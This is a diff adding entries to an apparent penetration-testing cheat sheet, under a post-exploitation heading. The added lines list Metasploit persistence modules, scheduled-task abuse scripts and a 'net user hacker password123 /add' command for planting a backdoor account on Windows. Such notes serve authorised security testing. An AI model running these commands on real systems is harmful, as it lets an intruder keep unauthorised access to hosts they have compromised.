@@ -107,10 +107,16 @@ Find vulns on windows while logged in
 
 ## Post Exploitation
 Persistence scripts
+* `run persistence -h`
+* `exploit/windows/local/persistence`
+* `exploit/windows/local/registry_persistence`
 
 Scheduled Tasks
+* `run scheduleme`
+* `run schtaskabuse`
 
 Add a User
+* `net user hacker password123 /add`
 
 ## Meterpreter etc
 `meterpreter > getuid`
